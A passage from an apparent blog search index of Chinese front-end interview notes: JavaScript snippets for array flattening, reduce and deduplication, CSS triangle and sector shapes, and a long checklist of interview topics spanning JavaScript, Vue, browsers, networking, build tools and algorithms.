punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//abcd</span></code></pre><p> （3）模拟块级作用域</p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="实现一个flattenDeep函数，把嵌套的数组扁平化"><a href="#实现一个flattenDeep函数，把嵌套的数组扁平化" class="headerlink" title="实现一个flattenDeep函数，把嵌套的数组扁平化"></a>实现一个flattenDeep函数，把嵌套的数组扁平化</h2><p><code>flattenDeep([1, [2, [3, [4]], 5]]); //[1, 2, 3, 4, 5]</code></p><p>（1）ES6的flat方法</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//flat 方法，用于将嵌套的数组“拉平”，变成一维的数组。该方法返回一个新数组，对原数组没有影响。</span><span class="token comment" spellcheck="true">//flat 默认只会 “拉平” 一层，如果想要 “拉平” 多层的嵌套数组，需要给 flat 传递一个整数，表示想要拉平的层数。</span><span class="token keyword">function</span> <span class="token function">flattenDeep</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>deepLength<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span>deepLength<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//当传递的整数大于数组嵌套的层数时，会将数组拉平为一维数组</span><span class="token keyword">function</span> <span class="token function">flattenDeep</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>（2）利用reduce和concat</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">flattenDeep</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>acc<span class="token punctuation">,</span>val<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token operator">?</span>acc<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token function">flattenDeep</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                     acc<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>（3）利用栈</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">flattenDeep</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>input<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//从stack中取值</span>        <span class="token keyword">const</span> next <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果取出的是数组，继续放到栈里</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果不是数组了，直接放到结果</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="关于reduce函数"><a href="#关于reduce函数" class="headerlink" title="关于reduce函数"></a>关于reduce函数</h2><blockquote><p>reduce() 方法接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。对空数组是不会执行回调函数的。 </p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//数组求和</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> sum <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>prev<span class="token punctuation">,</span> current<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> prev<span class="token operator">+</span>current<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//55</span><span class="token comment" spellcheck="true">//合并二维数组</span><span class="token keyword">var</span> twoArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'mu'</span><span class="token punctuation">,</span><span class="token string">'zi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'dig'</span><span class="token punctuation">,</span><span class="token string">'big'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'lucky'</span><span class="token punctuation">,</span><span class="token string">'jiji'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> oneArr <span class="token operator">=</span> twoArr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>total<span class="token punctuation">,</span>currentValue<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// console.log(total)</span>  <span class="token keyword">return</span> total<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>currentValue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>oneArr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//["mu", "zi", "dig", "big", "lucky", "jiji"]</span></code></pre><h2 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h2><p>（1）reduce + includes</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> current<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> prev<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span> <span class="token operator">?</span> prev <span class="token punctuation">:</span> prev<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>（2）利用ES6的Set数据结构</p><blockquote><p><code>set</code> 类似于数组，且成员值不重复都是唯一的，<code>set</code>本身是一个构造函数。 </p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">//[1,2,3]</span></code></pre><p>（3）for循环+splice</p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>            j<span class="token operator">--</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>（4）利用indexOf</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>array <span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            array <span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>（5）利用sort</p><pre class=" language-js"><code class="language-js">arr <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        array<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>（6）利用includes</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>array<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        array<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="时间复杂度和空间复杂度分别对应计算机什么资源"><a href="#时间复杂度和空间复杂度分别对应计算机什么资源" class="headerlink" title="时间复杂度和空间复杂度分别对应计算机什么资源"></a>时间复杂度和空间复杂度分别对应计算机什么资源</h2><blockquote><p>时间复杂度对应的是cpu，cpu就是用来做运算的，每个CPU都有一套自己可以执行的专门的<strong>指令集</strong>，经过取指，解码，执行的过程构成cpu的一个基本周期，空间复杂度对应的是内存。</p></blockquote><h2 id="css画三角形和扇形"><a href="#css画三角形和扇形" class="headerlink" title="css画三角形和扇形"></a>css画三角形和扇形</h2><pre class=" language-css"><code class="language-css"><span class="token comment" spellcheck="true">/*扇形*/</span><span class="token selector"><span class="token id">#box1</span> </span><span class="token punctuation">{</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">40</span>px solid<span class="token punctuation">;</span>  <span class="token property">border-color</span><span class="token punctuation">:</span> transparent transparent red<span class="token punctuation">;</span>  <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*三角形*/</span><span class="token selector"><span class="token id">#box2</span> </span><span class="token punctuation">{</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">40</span>px solid<span class="token punctuation">;</span>  <span class="token property">border-color</span><span class="token punctuation">:</span> transparent transparent red<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试知识点清单</title>
      <link href="2018/02/19/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B8%85%E5%8D%95/"/>
      <url>2018/02/19/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<ul><li><p>JavaScript基础</p><ul><li>面向对象与基于对象<ul><li>面向对象的三个基本特征</li><li>Js是基于对象但实现了面向对象编程(继承，函数重载)</li><li>如何实现继承（ES5六种，ES6的class）</li><li>原型与原型链</li><li>如何实现函数重载（arguments）</li></ul></li><li>语言的强类型/弱类型，静态类型/动态类型</li><li>数据类型<ul><li>5种基本 + 1种复杂 + 2种新增</li><li>Symbol：定义对象的唯一属性名</li><li>BigInt解决的问题，从64位浮点数谈起</li><li>值类型 / 引用类型，堆 / 栈</li></ul></li><li>进行类型判断的方式及优缺点<ul><li>typeof（type of null）</li><li>instanceof（手写实现）</li><li>Object.prototype.toString.call</li><li>判断数组的方法至少说出5种</li></ul></li><li>类型转换<ul><li>运算符带来的类型转换，<code>-，*，、，%</code>优先转数值，<code>+</code> 除外</li><li>+的规则，[] + {}，{} + []</li><li>== 和 === 的区别</li><li>什么情况 <code>a ===  a-1</code></li><li>什么情况 <code>a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3</code> 为true</li></ul></li><li>作用域<ul><li>全局作用域</li><li>函数作用域</li><li>块级作用域</li><li>词法作用域</li><li>动态作用域</li></ul></li><li>this的指向与new一个对象的过程</li><li>call / apply / bind</li><li>闭包</li><li>深拷贝与浅拷贝<ul><li>JSON.stringify中不安全的JSON值，参数</li><li>JSON.parse(JSON.stringify)的问题</li><li>手写一个深拷贝方法</li></ul></li><li>函数与变量解析顺序（一般为看代码说结果）</li><li>ES6及之后<ul><li>let / const </li><li>箭头函数</li><li>函数参数默认值</li><li>扩展运算符（构造数组，解析数组，参数赋值）</li><li>剩余运算符（接收参数）</li><li>Map, WeakMap, Set, WeakSet</li><li>include</li><li>模板字符串 </li><li>对象字面量的增强</li><li>Object.assign / Object.is / Object.values / Object.entries</li><li>forEach/find/map/filer/reduce/every/some</li><li>Array.from：如何初始化一个二维数组</li></ul></li><li>promise<ul><li>手写简易版promise</li><li>Generator</li><li>async / await</li><li>宏任务/微任务/事件循环</li><li>浏览器与node事件循环区别</li><li>面试题看代码说结果</li></ul></li><li>for in 与 for of<ul><li>for in（字符串）/ Object.keys / Object.getOwnProperty 区别</li><li>for of ，迭代器，Generator</li></ul></li><li>事件冒泡 / 事件捕获 / 事件委托<ul><li>DOM 事件流</li></ul></li><li>函数式编程<ul><li>高阶函数</li><li>纯函数  / 记忆函数</li><li>函数柯里化 / 函数组合</li></ul></li></ul></li><li><p>CSS基础</p><ul><li>盒模型</li><li>居中一个元素的方法</li><li>两栏布局（右侧自适应） / 三栏布局（中间自适应）</li><li>Flex 布局，三个值的含义</li><li>margin写两个值，三个值，四个值</li><li>css选择器的优先级规则</li><li>脱离文档流 / 定位 / 浮动的区别</li><li>清除浮动的方法</li><li>BFC布局规则，如何创建BFC</li><li>link 与 @import 的区别</li><li>画一个三角形 / 扇形</li><li>隐藏一个元素发方法</li><li>移动端 1px 问题</li><li>display / position / transform有哪些属性</li><li>如何实现图片懒加载</li><li>伪类和伪元素</li></ul></li><li>Vue相关<ul><li>Vue 响应式原理 2.x<ul><li>发布订阅模式（手写一个）</li><li>观察者模式</li><li>Vue 实例初始化过程</li><li>组件渲染过程（3种Watcher）</li><li>响应式过程总结</li><li>computed和watcher的原理，有什么区别及应用场景</li></ul></li><li>Vue 响应式原理 3.0 <ul><li>为什么采用Proxy，而不用Object.defineProperty</li><li>effect / track / trigger</li><li>reactive / ref / toRefs / computed</li></ul></li><li>Vue 组件通信的方式（8种）</li><li>Vuex<ul><li>State</li><li>Getters</li><li>Mutations</li><li>Actions</li><li>Modules</li></ul></li><li>Vue 中的 key的作用<ul><li>什么是虚拟 DOM</li><li>Diff算法的过程（patch / patchVnode / updateChildren）</li></ul></li><li>nextTick的原理</li><li>data为什么是函数</li><li>Keep-alive的原理<ul><li>LRU算法（FIFO / OPT）</li><li>分页 / 分段 / 段页结合</li><li>聊到操作系统顺便说一下进程与线程的区别</li><li>进程间通信的方式</li></ul></li><li>你做过哪些 Vue 的性能优化</li></ul></li><li>浏览器相关<ul><li>输入 URL 到页面展现的过程</li><li>GC算法 <ul><li>标记清除 / 引用计数 / 标记整理</li><li>内存泄漏 / 内存溢出</li><li>新生代 / 老生代</li></ul></li><li>浏览器多进程架构</li><li>渲染过程<ul><li>三个线程（Compositor Thread  / Main Thread / Compositor Tile Worker(s)）</li><li>js 会阻塞 DOM 解析</li><li>css 不会阻塞 DOM 解析会阻塞渲染</li><li>script标签中的async  / defer</li></ul></li><li>浏览器缓存<ul><li>前端缓存（HTTP缓存 / 浏览器缓存 / 应用程序缓存）</li><li>强缓存 / 协商缓存</li><li><strong>Cache-Control</strong> （max-age / no-cache / no-store）</li><li>ETag / Last-Modified</li><li>localStorage / sessionStorage / cookie </li></ul></li><li>标签页如何通信</li></ul></li><li>网络与协议相关<ul><li>什么是ajax（手写）</li><li>跨域的原因以及解决方式</li><li>http 和 https<ul><li>http 1.0 / 1.1 / 2.0</li><li>长连接与多路复用</li><li>SSL/TLS，对称加密 / 非对称加密</li><li>https主要流程，证书的作用</li></ul></li><li>TCP 三次握手 / 四次挥手<ul><li>SYN (synchronous建立联机)</li><li>ACK (acknowledgement 确认)</li><li>FIN (finish结束)</li><li>Sequence number (顺序号码)</li></ul></li><li>TCP 与 UDP 的区别于应用场景</li><li>osi七层模型与 tcp/ip 五层模型</li><li>cookie 与 session 的区别<ul><li>cookie带来的安全性问题及如何防御</li></ul></li></ul></li><li>前端模块化<ul><li>文件划分 / 命名空间 / IIFE / CommonJS / AMD / CMD</li><li>ESModuls</li></ul></li><li>前端安全<ul><li>XSS（反射型 / 存储型 / DOM型）</li><li>CSRF</li><li>点击劫持</li><li>HTTP传输安全</li><li>第三方依赖安全</li><li>控制台注入代码</li><li>钓鱼</li></ul></li><li>前端路由<ul><li>hash模式<ul><li>window.location.hash</li><li>onhashchange</li></ul></li><li>history模式<ul><li>pushState / replaceState / popState</li></ul></li></ul></li><li>设计模式<ul><li>工厂模式</li><li>抽象工厂模式</li><li>单例模式</li><li>建造者模式</li><li>适配器模式</li><li>装饰器模式</li><li>过滤器模式</li></ul></li><li>webpack<ul><li>webpack，rollup，parcel分别适用于什么场景</li><li>webpack插件主要是做什么的，常用的有哪些，自己写过webpack插件吗（compiler / compilation）</li><li>loader 和 plugin 的区别及用处</li><li>webpack 热更新原理</li><li>Sourcemap</li><li>Webpack-dev-server</li></ul></li><li>Vite<ul><li>快速冷启动</li><li>模块热更新</li><li>按需编译</li><li>开箱即用</li></ul></li><li>常用手写代码<ul><li>防抖 / 节流</li><li>柯里化</li><li>apply,bind,call</li><li>promise.all</li><li>promise.race</li><li>promise</li><li>发布订阅模式</li><li>数组扁平化</li></ul></li><li><p>instanceof</p><ul><li>new</li></ul></li><li><p>算法</p><ul><li>动态规划<ul><li>爬楼梯</li><li>最大子序列和</li><li>最长递增子序列</li><li>最长公共子序列</li><li>最长回文子串</li><li>三角形最小路径和</li><li>打家劫舍</li></ul></li><li>回溯算法<ul><li>组合总和 i / 组合总和 ii</li><li>数字全排列 / 二维数组全排列</li><li>括号生成</li><li>电话号码的数字组合</li><li>子集</li></ul></li><li>栈<ul><li>最长有效括号</li><li>去除重复字母</li><li>移掉 k 位数字</li><li>接雨水</li></ul></li><li>字符串<ul><li>最长公共前缀</li><li>最大非重复子串长度</li></ul></li><li>链表<ul><li>环形链表 i / 环形链表 ii</li><li>反转链表</li><li>合并两个有序链表 / 合并 k 个有序链表</li><li>删除链表倒数第 n 个节点</li><li>奇偶链表</li></ul></li><li>数组<ul><li>三数之和</li><li>合并区间</li><li>旋转矩阵</li><li>顺时针打印矩阵</li></ul></li><li>二叉树<ul><li>前序，中序，后序（递归 / <strong>非递归</strong>）</li><li>判断二叉树是否相同</li><li>判断二叉树是否对称</li><li>求二叉树的深度</li><li>翻转二叉树</li><li>二叉树的层次遍历</li><li>求二叉树的宽度</li><li>二叉树的右视图</li></ul></li><li>DFS / BFS <ul><li>DFS (递归 / 非递归)</li><li>BFS（非递归）</li><li>求根到叶子节点数字之和</li><li>单词接龙</li><li>N叉数的最大深度</li></ul></li><li>十大排序算法<ul><li>冒泡排序</li><li>选择排序</li><li>插入排序</li><li>希尔排序</li><li>归并排序</li><li>快速排序</li><li>堆排序</li><li>计数排序</li><li>桶排序</li><li>基数排序</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
